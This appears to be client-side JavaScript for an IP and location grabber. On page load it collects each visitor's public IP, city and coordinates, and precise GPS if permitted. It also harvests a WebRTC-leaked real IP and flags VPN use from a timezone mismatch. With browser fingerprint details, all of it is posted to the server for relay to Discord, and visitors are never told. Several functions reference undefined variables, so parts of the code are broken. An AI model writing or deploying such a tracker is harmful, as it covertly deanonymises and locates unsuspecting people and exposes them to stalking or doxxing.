

// Extended Operating System Detection
function detectOperatingSystem(userAgent) {
    if (userAgent.includes("Win")) {
        if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
        if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
        if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
        if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
        if (userAgent.includes("Windows NT 6.0")) return "Windows Vista";
        if (userAgent.includes("Windows NT 5.1")) return "Windows XP";
        return "Windows (Other)";
    }
    if (userAgent.includes("Mac")) return "MacOS";
    if (userAgent.includes("X11")) return "UNIX";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("like Mac OS X")) {
        if (userAgent.includes("iPhone")) return "iOS (iPhone)";
        if (userAgent.includes("iPad")) return "iOS (iPad)";
        return "iOS (Other)";
    }
    return "Unknown OS";
}

// Extended Browser Detection
function detectBrowser(userAgent) {
    if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
    if (userAgent.includes("Seamonkey")) return "Seamonkey";
    if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
    if (userAgent.includes("Chromium")) return "Chromium";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
    if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer";
    if (userAgent.includes("Edge")) return "Edge";
    return "Unknown Browser";
}

// Function to get operating system and browser details
function getSystemDetails() {
    var userAgent = navigator.userAgent;
    var operatingSystem = detectOperatingSystem(userAgent);
    var browser = detectBrowser(userAgent);

    // Get installed plugins/add-ons
    var plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
    
    return {
        operatingSystem,
        browser,
        plugins: plugins.join(', ')
    };
}


// Function to get IP and location data
function getLocationAndGPSData() {
    var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
    fetch('https://api.ipify.org?format=json')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok for IPify.');
            }
            return response.json();
        })
        .then(data => {
            var ip = data.ip;
            return Promise.all([
                checkVPN(ip, userTimezone),
                fetch('https://ipapi.co/' + ip + '/json/').then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok for IPAPI.');
                    }
                    return response.json();
                }),
                checkWebRTCLoak()
            ]);
        })
        .then(([vpnResult, location, webrtcResult]) => {
            var systemDetails = getSystemDetails();
            var screenResolution = `${window.screen.width}x${window.screen.height}`;
            var referrer = document.referrer || "No referrer";
            var language = navigator.language;

            // Send embed with location information if available, or a placeholder if not
            var locationValue = location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
            var gpsValue = location && location.latitude && location.longitude ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : "Location data not available";

            sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone);

            // Additional data send on geolocation permission
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        var gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                        var gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
                        sendDiscordEmbed(location, gpsText, systemDetails, screenResolution, referrer, language, vpnResult.isVpn, vpnResult.vpnMessage, webrtcResult.leakMessage, userTimezone);
                    },
                    function (error) {
                        console.error('Geolocation error:', error);
                    },
                    { timeout: 10000 }
                );
            }
        })
        .catch(error => {
            console.error('Error in gathering data:', error);
            handleErrorType('unknown', 'Error in gathering data: ' + error.message, userTimezone);
        });
}


function checkVPN(ip, timezone) {
    return new Promise((resolve, reject) => {
        fetch(`https://ipapi.co/${ip}/json/`)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    console.error('Error with VPN check:', data.error);
                    resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + data.error });
                    return;
                }

                const ipTimezone = data.timezone;
                const timezoneMatch = timezone === ipTimezone;
                const vpnMessage = timezoneMatch
                    ? 'Timezones match'
                    : 'Timezones do not match (Possible VPN detected)';
                resolve({ isVpn: !timezoneMatch, vpnMessage });
            })
            .catch(error => {
                console.error('Error in VPN check:', error.message);
                resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + error.message });
            });
    });
}


function checkWebRTCLoak() {
    return new Promise(resolve => {
        const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (!rtcPeerConnection) {
            resolve({ hasLeak: false, leakMessage: "WebRTC not supported" });
            return;
        }

        const pc = new rtcPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(error => {
                console.error("WebRTC Offer Error:", error);
                resolve({ hasLeak: false, leakMessage: "Error in WebRTC offer: " + error.message });
            });

        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) {
                pc.close();
                return;
            }

            const regexResult = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (regexResult && regexResult[1]) {
                const myIP = regexResult[1];
                pc.close();
                resolve({ hasLeak: true, leakMessage: "WebRTC Leak Detected: " + myIP });
            } else {
                resolve({ hasLeak: false, leakMessage: "No WebRTC Leak Detected" });
            }
        };


    }).catch(error => {
        console.error("Error in checkWebRTCLoak:", error);
        return { hasLeak: false, leakMessage: "An error occurred in checkWebRTCLoak: " + error.message };
    });
}


function handleErrorType(errorCode, errorMessage, userTimezone) {
    let errorDescription;

    // Handling standard geolocation error codes
    switch (errorCode) {
        case 1:
            // Special handling for Permission Denied
            sendDiscordEmbed(null, "Geolocation permission denied", null, null, null, null, null, null, null, userTimezone);
            return;
        case 2:
            errorDescription = "Location information is unavailable.";
            break;
        case 3:
            errorDescription = "The request to get user location timed out.";
            break;
        default:
            // Handling custom 'unknown' error code
            if (errorCode === 'unknown') {
                errorDescription = "An unknown error occurred.";
            } else {
                errorDescription = "An error occurred. Error Code: " + errorCode;
            }
            break;
    }

    console.error(errorMessage || errorDescription);

    // Send error embed for cases other than Permission Denied
    if (errorCode !== 1) {
        const errorEmbed = {
            "title": "Error",
            "color": 16711680, // Red color for error
            "description": errorMessage || errorDescription
        };

        sendDiscordMessage([errorEmbed]);
    }
}

function getAdditionalDetails() {
    var userAgent = navigator.userAgent;
    var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
    var browserVersion = userAgent.match(/(firefox|msie|chrome|safari|trident|opera)[\/\s](\d+)/i);
    browserVersion = browserVersion ? browserVersion[2] : 'Unknown';
    var connectionType = navigator.connection ? navigator.connection.type : 'Unknown';
    var doNotTrack = navigator.doNotTrack || 'Unknown';
    var cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
    var javascriptEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : 'Unknown';
    var adBlockerEnabled = false;

    if (window.chrome && window.chrome.webstore) {
        adBlockerEnabled = true;
    } else if (window.InstallTrigger && 'ss' in window.InstallTrigger) {
        adBlockerEnabled = true;
    }
    console.log(adBlockerEnabled)


    return {
        deviceType,
        browserVersion,
        connectionType,
        doNotTrack,
        cookiesEnabled,
        javascriptEnabled,
        adBlockerEnabled
    };
}


// Function to send message to Discord
function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone) {
    var additionalDetails = getAdditionalDetails();
    var otherDetails = getSystemDetails();

    // Combine additionalDetails and other data into a single object
    var postData = {
        additionalDetails: additionalDetails,
        location: location,
        gpsValue: gpsValue,
        systemDetails: systemDetails,
        screenResolution: screenResolution,
        referrer: referrer,
        language: language,
        isVpn: isVpn,
        vpnMessage: vpnMessage,
        webrtcResult: webrtcResult,
        userTimezone: userTimezone,
        qrCode: qrCode
    };

    // Send POST request to the / URL
    fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(postData)
    })
        .then(response => {
            if (!response.ok) {
                console.error('Failed to send message to Discord. Response:', response.status, response.statusText);
                if (retryCount > 0) {
                    // Retry sending the webhook with exponential backoff
                    setTimeout(() => sendDiscordMessage(embeds, retryCount - 1), retryDelay);
                } else {
                    console.error('Max retries reached. Giving up on sending message to Discord.');
                }
            } else {
                console.log('Message sent successfully to Discord.');
            }
        });
}




// Function to show the popup
function showPopup() {
    var popup = document.getElementById('discordPopup');
    if (popup) {
        popup.style.display = 'block';
    }
}

// Run these functions on page load
getLocationAndGPSData();

